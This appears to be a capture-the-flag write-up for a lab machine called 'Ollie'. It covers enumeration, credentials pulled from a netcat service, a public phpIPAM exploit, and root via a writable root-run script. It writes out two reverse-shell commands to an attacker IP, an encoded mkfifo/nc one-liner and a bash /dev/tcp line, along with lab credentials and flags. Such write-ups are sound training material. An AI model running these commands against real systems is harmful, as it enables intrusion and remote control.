ip add: 10.10.32.113

rustscan:
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
1337/tcp open  waste   syn-ack



nmap:
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b7:1b:a8:f8:8c:8a:4a:53:55:c0:2e:89:01:f2:56:69 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP5+l/iCTR0Sqa4q0dIntXiVyRE5hsnPV5UfG4D+sQKeM4XoG7mzycPzJxn9WkONCwgmLWyFD1wHOnexqtxEOoyCrHhP2xGz+5sOsJ7RbpA0KL/CAUKs2aCtonKUwg5FEhOjUy945M0e/DmstbOYx8od6603eb4TytHfxQHPPiWBBRCmg6e+5UjcHLSOqDEzXkDOmmLieiE008fEVrNAmF2J+I4XPJI7Usaf3IzpnaFm3Ca9YvNAr4t8gpDST2uNuRWA9NCMspBFEj/5YQfjOnYx2cSSZHUP3lK8tiwc/RWSk7OBTXYOBncyV4lw8OiyJ1fOhr/2gXTXE/tWQvu1zKWYYafMKRdsH6nuE5nZ0CK3pLHe/nUgIsVPl7sJ3QlqJF7Wd5OmY3e4Py7movqFm/HmW+zjwsXGHnzENC47N+RxV0XTYCxbKzTAZDo5gLMxmsbXWnQmU5GMk0e9sh7HHybmWWkKKYJiOp+3yM9vTPXPiNXBeJmvWa01hoAAi+3OU=
|   256 4e:27:43:b6:f4:54:f9:18:d0:38:da:cd:76:9b:85:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFL/P1VyyCYVY2aUZcXTLmHkiXGo4/KdJptRP7Wioy78Sb/W/bKDAq3Yl6a6RQW7KlGSbZ84who5gWwVMTSTt2U=
|   256 14:82:ca:bb:04:e5:01:83:9c:d6:54:e9:d1:fa:c4:82 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHmTKDYCCJVK6wx0kZdjLd1YZeLryW/qXfKAfzqN/UHv
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 851615F43921F017A297184922B4FBFD
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries 
|_/ /immaolllieeboyyy
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Ollie :: login
|_Requested resource was http://10.10.32.113/index.php?page=login
1337/tcp open  waste?  syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, GenericLines: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     It's been a while. What are you here for?
|   DNSVersionBindReqTCP: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     version
|     bind
|     It's been a while. What are you here for?
|   GetRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Get / http/1.0
|     It's been a while. What are you here for?
|   HTTPOptions: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / http/1.0
|     It's been a while. What are you here for?
|   Help: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Help
|     It's been a while. What are you here for?
|   NULL, RPCCheck: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name?
|   RTSPRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / rtsp/1.0
|_    It's been a while. What are you here for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.91%I=7%D=1/11%Time=63BEBA36%P=x86_64-pc-linux-gnu%r(NU
SF:LL,59,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\
SF:x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20
SF:")%r(GenericLines,93,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x2
SF:0of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20you
SF:r\x20name\?\x20What's\x20up,\x20\r\n\r!\x20It's\x20been\x20a\x20while\.
SF:\x20What\x20are\x20you\x20here\x20for\?\x20")%r(GetRequest,A1,"Hey\x20s
SF:tranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\
SF:x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x
SF:20Get\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\
SF:x20are\x20you\x20here\x20for\?\x20")%r(HTTPOptions,A5,"Hey\x20stranger,
SF:\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\
SF:x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Option
SF:s\x20/\x20http/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20a
SF:re\x20you\x20here\x20for\?\x20")%r(RTSPRequest,A5,"Hey\x20stranger,\x20
SF:I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20a
SF:ntlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20up,\x20Options\x2
SF:0/\x20rtsp/1\.0\r\n\r!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x
SF:20you\x20here\x20for\?\x20")%r(RPCCheck,59,"Hey\x20stranger,\x20I'm\x20
SF:Ollie,\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\
SF:.\n\nWhat\x20is\x20your\x20name\?\x20")%r(DNSVersionBindReqTCP,B0,"Hey\
SF:x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,\x20lover\x2
SF:0of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x20What's\x20u
SF:p,\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\x04bind\0\0\x10\0
SF:\x03!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20here\x20
SF:for\?\x20")%r(DNSStatusRequestTCP,9E,"Hey\x20stranger,\x20I'm\x20Ollie,
SF:\x20protector\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nW
SF:hat\x20is\x20your\x20name\?\x20What's\x20up,\x20\0\x0c\0\0\x10\0\0\0\0\
SF:0\0\0\0\0!\x20It's\x20been\x20a\x20while\.\x20What\x20are\x20you\x20her
SF:e\x20for\?\x20")%r(Help,95,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protec
SF:tor\x20of\x20panels,\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\
SF:x20your\x20name\?\x20What's\x20up,\x20Help\r!\x20It's\x20been\x20a\x20w
SF:hile\.\x20What\x20are\x20you\x20here\x20for\?\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


gobuster:
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.hta.html (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/api (Status: 301)
/app (Status: 301)
/config.php (Status: 200)
/css (Status: 301)
/db (Status: 301)
/functions (Status: 301)
/imgs (Status: 301)
/index.php (Status: 302)
/index.php (Status: 302)
/install (Status: 301)
/javascript (Status: 301)
/js (Status: 301)
/misc (Status: 301)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/upgrade (Status: 301)



check what is running on port 1337
nc 10.10.32.113 1337 
Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.

What is your name? Ollie
What's up, Ollie! It's been a while. What are you here for? Ollie
Ya' know what? Ollie. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: OllieUnixMontgomery!

PS: Good luck and next time bring some treats!

we have credentials: admin / OllieUnixMontgomery!

with these credentials we can log in to the webiste on port 80 which is running phpIPAM Admin(phpIPAM IP address management [v1.4.5])

search for exploit : https://www.exploit-db.com/exploits/50963
with the help of the exploit read the file /var/www/html/config.php

[+] Output:
1        <?php

/**
 * database connection details
 ******************************/
$db['host'] = 'localhost';
$db['user'] = 'phpipam_ollie';
$db['pass'] = 'IamDah1337estHackerDog!';
$db['name'] = 'phpipam';
$db['port'] = 3306;


get a shell using: python3 50963.py -url http://10.10.32.113 -usr admin -pwd OllieUnixMontgomery! -cmd 'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.8.29.89%204444%20%3E%2Ftmp%2Ff'

start nc listener

we have a shell with www-data

we have the user ollie, let's try it's password from above: OllieUnixMontgomery!

it works
user flag: THM{Ollie_boi_is_daH_Cut3st}

PRIVESC

uplpad pspy64 to the machine and notice that there is a program that runs with root and it can be read/write by ollie
/usr/bin/feedme

add the following to the feedme file:

ollie@hackerdog:/usr/bin$ echo '#!/bin/bash' > feedme
echo '#!/bin/bash' > feedme
ollie@hackerdog:/usr/bin$ cat feedme
cat feedme
#!/bin/bash
ollie@hackerdog:/usr/bin$ echo '/bin/bash -c "bash -i >& /dev/tcp/10.8.29.89/9001 0>&1"' >> feedme
<ash -i >& /dev/tcp/10.8.29.89/9001 0>&1"' >> feedme
ollie@hackerdog:/usr/bin$ cat feedme
cat feedme
#!/bin/bash
/bin/bash -c "bash -i >& /dev/tcp/10.8.29.89/9001 0>&1"

start a nc listener on 9001 to catch the shell:

root: THM{Ollie_Luvs_Chicken_Fries}
